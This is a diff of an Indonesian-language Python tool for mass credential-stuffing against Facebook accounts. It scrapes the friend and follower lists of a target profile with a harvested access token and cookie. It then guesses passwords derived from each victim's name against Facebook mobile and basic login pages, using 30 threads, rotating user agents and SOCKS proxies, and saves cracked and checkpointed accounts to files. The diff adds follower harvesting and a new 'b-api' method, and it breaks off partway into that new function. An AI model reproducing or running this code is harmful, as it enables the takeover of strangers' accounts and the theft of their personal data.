@@ -24,7 +24,7 @@ thn = datetime.datetime.now().year
 sekarang = str(tgl)+"-"+str(bln)+"-"+str(thn)
 cpz = str(tgl)+"-"+str(bln)+"-"+str(thn)+".txt"
 okz = str(tgl)+"-"+str(bln)+"-"+str(thn)+".txt"
-id,loop,id2,metode,uid,ok,cp,ua_crack,id3,id4=[],0,[],[],[],0,0,[],[],[]
+id,loop,id2,metode,uid,ok,cp,ua_crack,id3,id4,idez=[],0,[],[],[],0,0,[],[],[],[]
 pw_ni,pw_tambahan,pw_belakang,pw_lu,tampilkan_ttl,tampilkan_apk,tampilkan_opsi=[],[],[],[],[],[],[]
 
 for xyzx in range(1000):
@@ -341,21 +341,21 @@ def menu():
 	x=f"\t\t{P2}{hhl} {K2}{nama}\n\t\t{P2}tanggal lahirmu : {H2}{pko}\n\t\t{P2}ID kamu : {H2}{tumbal_id}\n\t\t{P2}IP kamu : {H2}{IP}\n\t\t{P2}negara kamu : {H2}{nibba}\n\t\t{P2}tanggal sekarang : {H2}{sekarang}"
 	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
 	print("")
-	x=f"\t\t{P2}[01] crack with public\n\t\t{P2}[02] checkpoint detectored\n\t\t{P2}[{M2}00{P2}] exit/delete cookie"
+	x=f"{P2}[01] crack with public\n{P2}[02] checkpoint detectored\n{P2}[{M2}00{P2}] exit/delete cookie"
 	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
 	HikmatXD = input(f"{garis} pilih : {H}")
 	if HikmatXD in ["1","01"]:
 		cracked_publickey()
 	elif HikmatXD in ["2","02"]:
 		print("")
-		x=f"{P2}\t\tfitur ini dalam masa pengembangan!! "
+		x=f"{P2}fitur ini dalam masa pengembangan!! "
 		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
 		input(f"{garis} enter untuk kembali ")
 		menu()
 		#check_detect()
 	elif HikmatXD in ["0","00"]:
 		print("")
-		x=f"\t\t{P2}[01] hapus cookie\n\t\t{P2}[02] exit\n\t\t{P2}[{H2}00{P2}] kembali"
+		x=f"{P2}[01] hapus cookie\n{P2}[02] exit\n{P2}[{H2}00{P2}] kembali"
 		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
 		zk = input(f"{garis} pilih : {H}")
 		if zk in ["1","01"]:
@@ -415,7 +415,61 @@ def massal_cracked_public():
 	for met in range(jum):
 		yz+=1
 		kl = input(garis+" masukan id ke "+H+str(yz)+P+" :"+H+" ")
+		token = open('token.txt','r').read()
+		cookie = open('cookie.txt','r').read()
+		coki = {"cookie":cookie}
+		coa = requests.get('https://graph.facebook.com/%s?access_token=%s'%(kl,token),cookies=coki)
+		el = json.loads(coa.text)
+		try:lk = el["name"]
+		except (KeyError,IOError):
+			lk = M+"-"+P
+		ooi = requests.get('https://graph.facebook.com/%s?access_token=%s'%(kl,token),cookies=coki)
+		oer = json.loads(ooi.text)
+		try:pok = oer["locale"]
+		except (KeyError,IOError):
+			pok = M+"-"+P
+		id8 = []
+		id9 = []
+		token = open('token.txt','r').read()
+		cookie = open('cookie.txt','r').read()
+		coki = {"cookie":cookie}
+		cyna = requests.get('https://graph.facebook.com/%s?fields=friends.limit(99999)&access_token=%s'%(kl,token),cookies=coki).json()
+		for fuck in cyna['friends']['data']:
+			try:id8.append(fuck['id']+'|'+fuck['name'])
+			except:continue
+		token = open('token.txt','r').read()
+		cookie = open('cookie.txt','r').read()
+		coki = {"cookie":cookie}
+		cyna = requests.get('https://graph.facebook.com/%s?fields=subscribers.limit(5000)&access_token=%s'%(kl,token),cookies=coki).json()
+		for fuck in cyna['subscribers']['data']:
+			try:id9.append(fuck['id']+'|'+fuck['name'])
+			except:continue
+		x=f"{P2}nama target : {H2}{lk}\n{P2}friends total : {H2}{len(id8)}\n{P2}followers total : {H2}{len(id9)}\n{P2}lokasi target akun : {H2}{pok}"
+		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
 		uid.append(kl)
+		idez.append(kl)
+	for yuk in idez:
+		try:
+			token = open('token.txt','r').read()
+			cookie = open('cookie.txt','r').read()
+			coki = {"cookie":cookie}
+			coa = requests.get('https://graph.facebook.com/%s?access_token=%s'%(yuk,token),cookies=coki)
+			el = json.loads(coa.text)
+			try:lk = el["name"]
+			except (KeyError,IOError):
+				lk = M+"-"+P
+			token = open('token.txt','r').read()
+			cookie = open('cookie.txt','r').read()
+			coki = {"cookie":cookie}
+			cyna = requests.get('https://graph.facebook.com/%s?fields=subscribers.limit(99999)&access_token=%s'%(yuk,token),cookies=coki).json()
+			for fuck in cyna['subscribers']['data']:
+				try:id3.append(fuck['id']+'|'+fuck['name'])
+				except:continue
+		except (KeyError,IOError):
+			pass
+		except requests.exceptions.ConnectionError:
+			jalan(garis+" koneksi internet bermasalah ")
+			exit()
 	for userr in uid:
 		try:
 			token = open('token.txt','r').read()
@@ -438,11 +492,11 @@ def massal_cracked_public():
 		except requests.exceptions.ConnectionError:
 			jalan(garis+" koneksi internet bermasalah ")
 			exit()
-	if len(id)==0:
-		x=f"{P2}\t\ttotal id : {M2}{str(len(id))}\n\t\t{P2}nama id target : {M2}{lk}"
+	if len(id) or len(id3)==0:
+		x=f"{P2}total friends : {H2}{len(id)}\n{P2}total followers : {H2}{len(id3)}"
 		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
 	else:
-		x=f"{P2}\t\ttotal id : {H2}{str(len(id))}\n\t\t{P2}nama id target : {H2}{lk}"
+		x=f"{P2}total friends : {H2}{len(id)}\n{P2}total followers : {H2}{len(id3)}"
 		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
 	settingers()
 
@@ -474,7 +528,7 @@ def cracked_public():
 			try:id3.append(fak['id']+'|'+fak['name'])
 			except:continue
 		#print(maling_pangsit+" nama target :%s %s"(H,lk))
-		x=f"{P2}\t\ttotal id : {H2}{str(len(id))}\n\t\t{P2}nama id target : {H2}{lk}\n{P2}\t\ttotal id followers : {H2}{str(len(id3))}"
+		x=f"{P2}total friends : {H2}{len(id)}\n{P2}total followers : {H2}{len(id3)}"
 		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
 		settingers()
 	except requests.exceptions.ConnectionError:
@@ -483,48 +537,40 @@ def cracked_public():
 	except (KeyError,IOError):
 		jalan(garis+" gagal dump id... mungkin privat friends/gada friends nya") 
 		exit()
-		#settingers()
 	
 def settingers():
 	print("")
-	x=f"\t\t{P2}[01] crack urutan new\n\t\t{P2}[02] crack urutan old\n\t\t{P2}[03] crack urutan random"
+	x=f"\t\t{P2}khusus crack public\n{P2}[01] crack urutan new ({H2}public crack{P2})\n{P2}[02] crack urutan old ({H2}public crack{P2})\n{P2}[03] crack urutan random ({H2}public crack{P2})\n\t\t{P2}khusus crack followers\n{P2}[04] crack urutan new ({H2}followers crack{P2})\n{P2}[05] crack urutan old ({H2}followers crack{P2})\n{P2}[06] crack urutan random ({H2}followers crack{P2})"
 	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
 	GlukTzy = input(garis+" pilih : "+H)
 	if GlukTzy in ['2','02']:
 		for bacot in id:
 			id2.append(bacot)
-		for kont in id3:
-			id4.append(kont)
 	elif GlukTzy in ['1','01']:
 		for bacot in id:
 			id2.insert(0,bacot)
-		for kont in id3:
-			id4.insert(0,kont)
 	elif GlukTzy in ['3','03']:
 		for bacot in id:
 			xx = random.randint(0,len(id2))
 			id2.insert(xx,bacot)
+	elif GlukTzy in ['5','05']:
+		for kont in id3:
+			id4.append(kont)
+	elif GlukTzy in ['4','04']:
+		for kont in id3:
+			id4.insert(0,kont)
+	elif GlukTzy in ['6','06']:
 		for kont in id3:
 			xx = random.randint(0,len(id4))
 			id4.insert(xx,bacot)
 	else:
 		jalan(garis+" isi yang benar")
 		settingers()
-	print("")
-	x=f"\t\t{P2}ketik {H2}d {P2}untuk lanjut crack public\n\t\t{P2}ketik {H2}m{P2} untuk lanjut crack followers\n\t\t{P2}kalo kamu pilih crack massal pilih saja {H2}d{P2}"
-	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
-	pilihan = input(f"{garis} pilih {H}d{P}/{H}m{P} : {H}")
-	if pilihan in ["d","D"]:
-		crack_public_pilihan()
-	elif pilihan in ["m","M"]:
-		crack_followers_pilihan()
-	else:
-		jalan(f"{garis} isi yang benar ")
-		pilih_crack()
+	crack_public_pilihan()
 
 def crack_public_pilihan():
 	print("")
-	x=f"\t\t{P2}[01] methode mobile ({H2}slowed cracked{P2})\n\t\t{P2}[02] methode mbasic ({K2}fast cracked{P2})\n\t\t{P2}[03] methode free  ({M2}not recommended {P2})\n\t\t{P2}[04] methode mobile version 2  ({H2}testions{P2})"
+	x=f"{P2}[01] methode mobile ({H2}slowed cracked{P2})\n{P2}[02] methode mbasic ({K2}fast cracked{P2})\n{P2}[03] methode free   ({M2}not recommended {P2})\n{P2}[04] methode mobile version 2 ({H2}new{P2})\n{P2}[05] methode b-api  ({H2}very fast cracked{P2})"
 	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
 	met = input(garis+" pilih : "+H)
 	if met in ["1","01","a"]:
@@ -535,13 +581,15 @@ def crack_public_pilihan():
 		metode.append("free")
 	elif met in ["4","04"]:
 		metode.append("mobile_v2")
+	elif met in ["5","05"]:
+		metode.append("bapi")
 	else:
 		metode.append("mobile")
 	print("")
 	pw_tambahani = input(garis+" ingin menambahkan password tambahan ("+H+"y"+P+"/"+M+"t"+P+") ? :"+H+" ")
 	if pw_tambahani in ["y","Y","yes","Ya","Yes"]:
 		pw_tambahan.append("ya")
-		x=f"\t\t{P2}contoh password tambahan : {H2}anjing,ngentot,sayang "
+		x=f"{P2}contoh password tambahan : {H2}anjing,ngentot,sayang "
 		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
 		pw_nya_cok = input(garis+" password tambahan :"+H+" ")
 		pw_gw=pw_nya_cok.split(',')
@@ -568,7 +616,7 @@ def crack_public_pilihan():
 	pw_tambahai = input(garis+" ingin menambahkan password belakang nama ("+H+"y"+P+"/"+M+"t"+P+") ? :"+H+" ")
 	if pw_tambahai in ["y","Y","yes","Ya","Yes"]:
 		pw_belakang.append("ya")
-		x=f"\t\t{P2}contoh password belakang : {H2}anjing,ngentot,sayang "
+		x=f"{P2}contoh password belakang : {H2}anjing,ngentot,sayang "
 		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
 		pw_nya_cok = input(garis+" password belakang nama :"+H+" ")
 		pw_gw=pw_nya_cok.split(',')
@@ -581,12 +629,12 @@ def crack_public_pilihan():
 	pilpas = input(garis+" ingin memakai password manual ("+H+"y"+P+"/"+M+"t"+P+") ? :"+H+" ")
 	if pilpas in ["y","Y","ya","yes"]:
 		with tread(max_workers=30) as HikmatXF:
-			x=f"\t\t{P2}contoh password : {H2}anjing,ngentot,sayang "
+			x=f"{P2}contoh password : {H2}anjing,ngentot,sayang "
 			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
 			listpass = input(garis+"%s list password :%s "%(P,H))
 			if len(listpass)<=5:
 				exit("\n"+garis+"%s password minimal 6 angka"%(M))
-			x=f"\t\t{P2}list password crack {H2}{listpass}"
+			x=f"{P2}list password crack {H2}{listpass}"
 			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
 			print("")
 			x=f"{P2}hasil crack ok tersimpan di {H2}OK/{sekarang}.txt\n{P2}hasil crack cp tersimpan di {K2}CP/{sekarang}.txt\n{P2}kalo tidak ada hasil coba mode pesawat 5 detik trus hidupin lagi data nya\nmoga dapet banyak yakk result nya "
@@ -596,7 +644,7 @@ def crack_public_pilihan():
 				HikmatXF.submit(mobile, user, listpass.split(","))
 		print("")
 		if len(ok) != 0 or len(cp) != 0:
-			x=f"\t\t{P2}hasil cp mu : {K2}{len(cp)}\n\t\t{P2}hasil ok mu : {H2}{len(ok)}"
+			x=f"{P2}hasil cp mu : {K2}{len(cp)}\n{P2}hasil ok mu : {H2}{len(ok)}"
 			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
 			input(garis+" kembali ")
 			menu()
@@ -614,7 +662,7 @@ def passwer():
 	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
 	print("")
 	with tread(max_workers=30) as HikmatXD:
-		for koncol in id2:
+		for koncol in id2 or id4:
 			uiz,mmk = koncol.split('|')[0],koncol.split('|')[1].lower()
 			prot = mmk.split(' ')[0]
 			pwr = []
@@ -650,11 +698,13 @@ def passwer():
 				HikmatXD.submit(free,uiz,pwr)
 			elif "mobile_v2" in metode:
 				HikmatXD.submit(mobile_v2,uiz,pwr)
+			elif "bapi" in metode:
+				HikmatXD.submit(api,uiz,pwr)
 			else:
 				HikmatXD.submit(mobile,uiz,pwr)
 	print("")
 	if ok != 0 or cp != 0:
-		x=f"\t\t{P2}hasil cp mu : {K2}{cp}\n\t\t{P2}hasil ok mu : {H2}{ok}"
+		x=f"{P2}hasil cp mu : {K2}{cp}\n{P2}hasil ok mu : {H2}{ok}"
 		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
 		input(garis+" kembali ")
 		menu()
@@ -669,15 +719,14 @@ def mobile(uiz,pwr):
 	ua_crack = ["Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.69 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Focus/1.0 Chrome/59.0.3029.83 Mobile Safari/537.36","Mozilla/5.0 (X11; Linux armv6l) EkiohFlow/5.13.4.34727M Flow/5.13.4 (like Gecko Firefox/62.0 rv:62.0)","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Silk/102.2.1 like Chrome/102.0.5005.125 Safari/537.36","Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.101 Safari/537.36 OPR/40.0.2308.62","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36 PTST/220727.141334","Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.8.0.8) Gecko/20061025 Firefox/1.5.0.8","Links (2.20.2; Linux 5.4.0-100-generic x86_64; GNU C 9.2.1; text)","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/68.0.2785.34 Safari/537.31 SmartTV/8.5","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Safari/537.36","Mozilla/5.0 (Linux; x86_64 GNU/Linux) AppleWebKit/601.1 (KHTML, like Gecko) Version/8.0 Safari/601.1 WPE comcast/ipstb (comcast, 1.0.0.0)","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/68.0.2785.34 Safari/537.31 SmartTV/8.5","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.3945.79 Safari/537.36 SmartTV/10.0 Colt/2.022","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.3945.79 Safari/537.36 SmartTV/10.0 Colt/2.0","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3440.106 Safari/537.36 SmartTV/9.0 Crow/1.0"]
 	ua = random.choice(ua_crack)
 	ses = requests.Session()
-	runc= random.choice([K,M,U,O,B,H])
-	#randomwar = random.choice(["["+randomly+"•\x1b[0m ]","["+randomly+"•  •\x1b[0m]", "["+randomly+"•  •  •\x1b[0m]", "["+randomly+"■■■■\x1b[0m□□□□□□]", "["+randomly+"■■■■■\x1b[0m□□□□□]", "["+randomly+"■■■■■■\x1b[0m□□□□]", "["+randomly+"■■■■■■■\x1b[0m□□□]", "["+randomly+"■■■■■■■■\x1b[0m□□]", "["+randomly+"■■■■■■■■■\x1b[0m□]", "["+randomly+"■■■■■■■■■■\x1b[0m]"])
-	sys.stdout.write("\r %s• %scracked %s%s/%s %sok:%s %scp:%s "%(P,runc,P,len(id2),loop,H,ok,K,cp)); sys.stdout.flush()
+	runc= random.choice([K,M,U,O,B,H]) 
+	sys.stdout.write("\r %s• %scracked %s%s/%s %sok:%s %scp:%s "%(P,runc,P,len(id2 or id4),loop,H,ok,K,cp)); sys.stdout.flush()
 	for pw in pwr:
 		pw = pw.lower()
 		try:
 			proxff= open('proxy_mat.txt','r').read().splitlines()
 			cuukk=random.choice(proxff)
-			proxs= {'http': 'socks5://'+cuukk}
+			proxs= {'http': 'socks4://'+cuukk}
 			#proxs2= {'http': 'socks4://'+nip}
 			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
 			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+uiz+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
@@ -759,14 +808,13 @@ def mobile_v2(uiz,pwr):
 	ua = random.choice(ua_crack)
 	ses = requests.Session()
 	runc= random.choice([K,M,U,O,B,H])
-	#randomwar = random.choice(["["+randomly+"•\x1b[0m ]","["+randomly+"•  •\x1b[0m]", "["+randomly+"•  •  •\x1b[0m]", "["+randomly+"■■■■\x1b[0m□□□□□□]", "["+randomly+"■■■■■\x1b[0m□□□□□]", "["+randomly+"■■■■■■\x1b[0m□□□□]", "["+randomly+"■■■■■■■\x1b[0m□□□]", "["+randomly+"■■■■■■■■\x1b[0m□□]", "["+randomly+"■■■■■■■■■\x1b[0m□]", "["+randomly+"■■■■■■■■■■\x1b[0m]"])
 	sys.stdout.write("\r %s• %scracked %s%s/%s %sok:%s %scp:%s "%(P,runc,P,len(id2),loop,H,ok,K,cp)); sys.stdout.flush()
 	for pw in pwr:
 		pw = pw.lower()
 		try:
 			proxff= open('proxy_mat.txt','r').read().splitlines()
 			cuukk=random.choice(proxff)
-			proxs= {'http': 'socks5://'+cuukk}
+			proxs= {'http': 'socks4://'+cuukk}
 			#proxs2= {'http': 'socks4://'+nip}
 			url = "m.facebook.com"
 			headers1= {
@@ -888,14 +936,13 @@ def mbasic(uiz,pwr):
 	ua = random.choice(ua_crack)
 	ses = requests.Session()
 	runc= random.choice([K,M,U,O,B,H])
-	#randomwar = random.choice(["["+randomly+"•\x1b[0m ]","["+randomly+"•  •\x1b[0m]", "["+randomly+"•  •  •\x1b[0m]", "["+randomly+"■■■■\x1b[0m□□□□□□]", "["+randomly+"■■■■■\x1b[0m□□□□□]", "["+randomly+"■■■■■■\x1b[0m□□□□]", "["+randomly+"■■■■■■■\x1b[0m□□□]", "["+randomly+"■■■■■■■■\x1b[0m□□]", "["+randomly+"■■■■■■■■■\x1b[0m□]", "["+randomly+"■■■■■■■■■■\x1b[0m]"])
 	sys.stdout.write("\r %s• %scracked %s%s/%s %sok:%s %scp:%s "%(P,runc,P,len(id2),loop,H,ok,K,cp)); sys.stdout.flush()
 	for pw in pwr:
 		pw = pw.lower()
 		try:
 			proxff= open('proxy_mat.txt','r').read().splitlines()
 			cuukk=random.choice(proxff)
-			proxs= {'http': 'socks5://'+cuukk}
+			proxs= {'http': 'socks4://'+cuukk}
 			#proxs2= {'http': 'socks4://'+nip}
 			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
 			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+uiz+'&flow=login_no_pin&next=https%3A%2F%2Fmbasic.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
@@ -977,15 +1024,13 @@ def free(uiz,pwr):
 	ua = random.choice(ua_crack)
 	ses = requests.Session()
 	runc= random.choice([K,M,U,O,B,H])
-	#randomwar = random.choice(["["+randomly+"•\x1b[0m ]","["+randomly+"•  •\x1b[0m]", "["+randomly+"•  •  •\x1b[0m]", "["+randomly+"■■■■\x1b[0m□□□□□□]", "["+randomly+"■■■■■\x1b[0m□□□□□]", "["+randomly+"■■■■■■\x1b[0m□□□□]", "["+randomly+"■■■■■■■\x1b[0m□□□]", "["+randomly+"■■■■■■■■\x1b[0m□□]", "["+randomly+"■■■■■■■■■\x1b[0m□]", "["+randomly+"■■■■■■■■■■\x1b[0m]"])
 	sys.stdout.write("\r %s• %scracked %s%s/%s %sok:%s %scp:%s "%(P,runc,P,len(id2),loop,H,ok,K,cp)); sys.stdout.flush()
 	for pw in pwr:
 		pw = pw.lower()
 		try:
 			proxff= open('proxy_mat.txt','r').read().splitlines()
 			cuukk=random.choice(proxff)
-			proxs= {'http': 'socks5://'+cuukk}
-			#proxs2= {'http': 'socks4://'+nip}
+			proxs= {'http': 'socks4://'+cuukk}
 			ses.headers.update({'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
 			p = ses.get('https://free.facebook.com/login/device-based/password/?uid='+uiz+'&flow=login_no_pin&next=https%3A%2F%2Ffree.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
 			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":uiz,"next":"https://free.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
@@ -1060,9 +1105,38 @@ def free(uiz,pwr):
 			turu(31)
 	loop+=1
 
+def api(uiz,pwr):
+	global ok,cp,loop
+	ua_crack = ["Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.69 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Focus/1.0 Chrome/59.0.3029.83 Mobile Safari/537.36","Mozilla/5.0 (X11; Linux armv6l) EkiohFlow/5.13.4.34727M Flow/5.13.4 (like Gecko Firefox/62.0 rv:62.0)","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Silk/102.2.1 like Chrome/102.0.5005.125 Safari/537.36","Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.101 Safari/537.36 OPR/40.0.2308.62","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36 PTST/220727.141334","Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.8.0.8) Gecko/20061025 Firefox/1.5.0.8","Links (2.20.2; Linux 5.4.0-100-generic x86_64; GNU C 9.2.1; text)","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/68.0.2785.34 Safari/537.31 SmartTV/8.5","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Safari/537.36","Mozilla/5.0 (Linux; x86_64 GNU/Linux) AppleWebKit/601.1 (KHTML, like Gecko) Version/8.0 Safari/601.1 WPE comcast/ipstb (comcast, 1.0.0.0)","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/68.0.2785.34 Safari/537.31 SmartTV/8.5","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.3945.79 Safari/537.36 SmartTV/10.0 Colt/2.022","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.3945.79 Safari/537.36 SmartTV/10.0 Colt/2.0","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3440.106 Safari/537.36 SmartTV/9.0 Crow/1.0"]
+	ua = random.choice(ua_crack)
+	ses = requests.Session()
+	runc= random.choice([K,M,U,O,B,H])
